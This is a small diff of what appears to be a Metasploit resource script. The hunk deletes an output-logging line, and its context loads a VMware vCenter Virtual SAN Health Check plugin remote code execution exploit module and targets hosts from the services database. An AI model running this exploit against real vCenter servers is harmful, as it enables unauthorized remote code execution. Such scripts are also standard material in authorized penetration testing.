@@ -257,7 +257,6 @@ set srvport 8081
 check
 sleep 5
 
-spool /root/output/msf/vmtest.txt
 echo "VMware vCenter Server Virtual SAN Health Check Plugin RCE"
 use exploit/linux/http/vmware_vcenter_vsan_health_rce
 services -S vCenter -R
